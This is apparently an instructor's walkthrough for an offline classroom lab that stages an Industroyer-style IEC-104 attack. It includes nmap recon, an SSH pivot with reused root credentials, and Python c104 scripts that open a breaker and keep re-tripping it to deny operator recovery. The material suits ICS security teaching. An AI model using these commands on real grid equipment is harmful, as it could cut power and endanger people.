# Scenario B — classroom walkthrough (IEC‑104 / Industroyer)

A direct, step‑by‑step guide to **set up, deploy, and present** Scenario B with the
scenario runner. Design, node roles and the full attack chain are in
[`ics-scenarios-agent-guide.md`](./ics-scenarios-agent-guide.md); this is the operator's
script for running it live in front of a class.

**What you demonstrate:** an IT foothold pivots through a dual‑homed host into the OT
network and sends one *unauthenticated, perfectly legal* IEC‑104 command that opens a
breaker — no exploit, no malware — then **denies the operator recovery** (every attempt to
re‑close the breaker from the HMI is instantly overridden). The lab runs **fully offline
inside Kathará**; every step is standard admin tooling (`nmap`, `ssh`) or an ordinary
IEC‑104 client, and nothing is written outside the lab's own containers.

> **The topology ships two ready‑made scenarios** (switch with the runner's scenario
> selector). Skim "Confirm before class" (last section) and **pre‑warm the `tollan/*`
> images** well before students arrive — the first sync and deploy are slow.

---

## Part 0 — Before class (do this ahead of time)

Image sync and the first deploy are slow (Docker Hub anonymous pulls are rate‑limited,
and the OVS/tools images build locally). Run Parts 1–3 **once the day before**, pick your
scenario and leave it saved, then `Destroy` and re‑`Deploy` just before presenting.

---

## Part 1 — Start AE3GIS and open the UI

1. In the project root: `./start.sh` (compose: frontend **:3000**, backend **:8000**), or
   `cd frontend && npm run dev` for the Vite dev server on **:5173**.
2. Open the UI (**http://localhost:3000**, or **:5173** for the dev server) → the
   **Topology library**.

The title bar's **Deploy / status** area is your at‑a‑glance "is it running" indicator all
session; click the status badge any time to see job steps and logs.

## Part 2 — Load the scenario and add its registry

1. Library page -> **Presets** -> **Load** *ICS Scenario B - IEC-104 / Industroyer*
   (or **Import JSON** -> `docs/ics-scenarios/scenario-b-iec104.topology.json`). It
   opens as three subnets (IT-LAN `10.0.5.0/24`, OT-LAN `10.0.3.0/24`,
   PROCESS `10.0.1.0/24`), 10 devices.
2. A banner appears: *"This scenario uses images from Docker Hub namespace
   `tollan` - not added yet."* Click **Add & sync**. It adds
   `https://hub.docker.com/u/tollan` and syncs (only repos marked `[ae3gis]` are
   pulled); wait for it to finish.
3. The images banner then lists anything to build or pull (e.g. `open-vswitch` /
   the tools image) - click **Build now** to pre-warm, or let **Deploy** handle it.

**CHECK:** the palette's device types (PLC, HMI, IDS, ...) now list `tollan/*` variants.


## Part 3 — Deploy and verify it's up

1. Top bar → **Deploy**. Watch the status badge step through
   `validate → images → plan → deploy → verify`.
2. **CHECK it's live:** every device card turns green (running). Click the status badge to
   read per‑step logs if anything stalls.
3. **CHECK addressing (optional, convincing):** double‑click `historian` to open a
   terminal in the dock → `ip -o addr show` shows both `10.0.5.20` and `10.0.3.20`.
4. **CHECK the SPAN works (optional):** on the `ot-sw ↔ ids` link (or the `ids` node) →
   **Start capture**; you should see HMI↔PLC traffic the IDS is mirrored.

---

## Part 4 — Pick a scenario in the runner

Open the runner: **More → Scenario runner…** (or ⌘K → "Scenario runner"). The topology
ships **two ready‑made scenarios**; switch between them with the **scenario selector** (the
dropdown at the top of the panel, shown whenever there's more than one). It renders **one
scenario at a time** as phases of steps; **Run phase** / **Run step** stream each command's
live output into a tab.

> **How the runner executes:** each step is **one command run inside the node you pick**
> (`docker exec`), output streamed; it does *not* carry a shell session between steps. That
> is exactly what separates the two scenarios below.

### Scenario 1 — "Industroyer walkthrough" (simplest to narrate)
The OT actions run **directly on the `historian`** — a deliberate teaching shortcut (the
dual‑homed historian is where the real attacker would launch them from).

| Phase | Node | What runs / teaches |
|---|---|---|
| 0 Prepare | `ids`, `hmi` | start Zeek over the OT SPAN mirror; point the HMI at the RTU |
| 1 Recon & boundary | `attacker` | `nmap -sn` finds the historian; `nmap -Pn -p 2404 10.0.3.50` is **filtered** (firewall holds); `sshpass … ssh root@10.0.5.20 …` pivots in and shows the host is **dual‑homed** |
| 2 Reach & command | `historian` | from here the RTU is **open**; one `c104` `C_SC_NA_1` command (CA 47, IOA 12) **opens the breaker** — the thesis |
| 3 Deny recovery (loss of control) | `historian` | a `c104` loop **re‑opens the breaker on every operator Close** — the operator can't restore the process. Contained; **Stop** ends it |
| 4 Detection & debrief | `ids` | the control shows in Zeek's `conn.log` only as **bare TCP to :2404** — IEC‑104 has no open analyzer; the detectability gap is itself the finding |

### Scenario 2 — "Lateral movement — from the attacker box" (the faithful version)
Every attacker step runs **on the `attacker` node**; OT actions are tunnelled over SSH to
the historian, so the lateral movement is explicit and each command is copy‑paste‑able into
an `attacker` terminal. Same arc, cleaner: P1 recon → **P2 pivot** (`ssh root@10.0.5.20`
lands on the dual‑homed historian) → **P3 command** (the c104 open‑breaker, shipped
base64‑over‑SSH) → **P4 deny recovery** (the re‑trip loop over `ssh -tt`, so **Stop** tears
down the *remote* process too) → P5 detection.

> **A note on "loss of view."** The original design called for *severing the HMI's view*; in
> practice this `tollan/c104-server` happily serves many concurrent IEC‑104 sessions, so
> flooding it does not blind the HMI. Both scenarios instead demonstrate **loss of control /
> recovery denial** — reliable, HMI‑visible, and just as true to Industroyer.

**To build your own** instead, click **New scenario** (the selector jumps to it) and add
phases/steps. Running needs a **deployed** lab with **no unsaved edits** (the runner runs
what was deployed) — click **Save** first.

---

## Part 5 — Present it

Baseline first. **SHOW** the process view: select `process-sim` → inspector →
**Web UI → Open web UI** (its page loads in the dock; fullscreen the dock for the
projector). Do the same for `hmi`. Breaker closed, city powered, HMI green.

Pick a scenario in the selector, then walk its phases in order. For each, click **Run
phase** (or **Run step** per row): a tab opens with the command, its **streamed output**
and an **exit** badge. Narrating the "Industroyer walkthrough":

- **Phase 1 (Recon & boundary)** — SAY: "Our foothold is on IT." The RTU scan is
  **filtered** → **"segmentation is doing its job from here."** The SSH pivot lands on the
  historian and prints two IPs → **"…but this host has a foot in both networks."**
- **Phase 2 (Reach & command)** — the same scan from the historian **succeeds**, then the
  one control command. SHOW the **HMI flip to breaker‑OPEN** (and the process view go dark).
  SAY: **"No exploit. A legitimate protocol command. The protocol has no authentication, so
  reachability *is* control."**
- **Phase 3 (Deny recovery)** — run it, then **try to Close the breaker on the HMI**: it
  snaps straight back to OPEN. SAY: **"The operator has lost control — they can't
  re‑energize."** Click **Stop** on the tab; Close then holds again.
- **Phase 4 (Detection & debrief)** — open the IDS output: the control shows only as a bare
  TCP connection to `:2404`. Contrast IEC‑104's thin coverage with Modbus (Scenario A).

(The **"Lateral movement"** scenario narrates the same beats, but every step runs from the
`attacker` node and the pivot is an explicit `ssh` into the historian.)

A long step (Phase 3) keeps running while you talk — leave its tab open and click **Stop**
when done; Stop now also kills the command *inside* the container.

## Part 6 — Reset

**Destroy** (top bar) returns to a clean, idle topology; captures/runs are stopped first.
**Deploy** again for the next run. Your scenarios stay saved with the topology.

---

## Running it by hand (no runner)

The same attack typed directly — handy for a live terminal demo, or to see exactly what the
runner automates. SSH into the historian **once** (interactively), then everything runs
locally on it: no `sshpass`, no base64.

**On `attacker`:**

```bash
nmap -sn 10.0.5.0/24           # find the historian at .20
ssh root@10.0.5.20             # pivot in — password: pass
```

**Then on `historian`** (a shell with a leg in both networks):

```bash
hostname; ip -o addr show      # eth0 10.0.5.20 (IT) + eth1 10.0.3.20 (OT)
nmap -Pn -p 2404 10.0.3.50     # the RTU is open from here (it's filtered from the attacker)
```

**Open the breaker** — one IEC‑104 command (station CA 47, command point IOA 12; `False` = OPEN):

```bash
/opt/venv/bin/python3 <<'PY'
import c104, time
c = c104.Client(); conn = c.add_connection(ip="10.0.3.50", port=2404)
cmd = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)
c.start(); time.sleep(2)
cmd.value = False                               # False = OPEN (True = CLOSE)
print("open ->", cmd.transmit(cause=c104.Cot.ACTIVATION))
PY
```

The HMI flips to OPEN (red) and `process-sim` goes dark.

**Deny recovery** — re‑open on every operator Close (Ctrl‑C to stop; monitor point IOA 11, `True` = CLOSED):

```bash
/opt/venv/bin/python3 <<'PY'
import c104, time
c = c104.Client(); conn = c.add_connection(ip="10.0.3.50", port=2404)
st = conn.add_station(common_address=47)
state = st.add_point(io_address=11, type=c104.Type.M_SP_NA_1)
cmd   = st.add_point(io_address=12, type=c104.Type.C_SC_NA_1)
c.start(); time.sleep(2)
cmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)     # start tripped
print("denying recovery — Ctrl-C to stop")
while True:
    conn.interrogation(common_address=47); time.sleep(0.5)
    if state.value is True:                                   # operator re-closed on the HMI
        cmd.value = False; cmd.transmit(cause=c104.Cot.ACTIVATION)
        print("operator CLOSE -> re-OPENed")
PY
```

**Detection** — on `ids`:

```bash
grep -v '^#' /root/zeeklogs/conn.log | tail    # the control shows only as TCP to :2404
```

---

## Confirm before class (pre‑checks + gotchas)

1. **The IEC‑104 client calls are already filled in.** Both scenarios ship the real `c104`
   commands (open‑breaker and the re‑trip loop), derived from the HMI's own client. If you
   rebuild the `tollan/c104-*` images, re‑confirm **CA 47 / IOA 12** and that the `c104` API
   still matches, then re‑paste if needed. The guide's §7/§9 is the reference.
2. **Showing the process / HMI view.** One‑click: inspector → **Open web UI** (the preset
   sets `process-sim`'s port to 8000 and `hmi`'s to 8080); the backend relays the node's
   page to the dock iframe. Fullscreen the dock for the projector. For a node whose port
   differs, fill **Web UI → Port** in the inspector first.
3. **Tooling presence.** `nmap` is in the `attacker` image; `sshpass` + reused creds
   (`root:pass`) drive the pivot; the `historian` carries the `c104` client in `/opt/venv`.
   The **"Lateral movement"** scenario also needs `ssh` on the attacker (it is present).
4. **Pre‑warm.** First registry sync + first deploy are slow; do Parts 1–3 ahead of time.
5. **Run gating.** If a **Run** button is greyed out: the lab isn't deployed, or you have
   unsaved edits — click **Save**. The runner always runs the *deployed* topology.
6. **"Loss of view" vs "loss of control."** This RTU serves concurrent IEC‑104 sessions, so
   you cannot blind the HMI by flooding it — the scenarios demonstrate **recovery denial /
   loss of control** instead (reliable and HMI‑visible). A true loss‑of‑view would need an
   L2 MITM (ARP‑spoof the HMI↔RTU path), which is out of scope here.
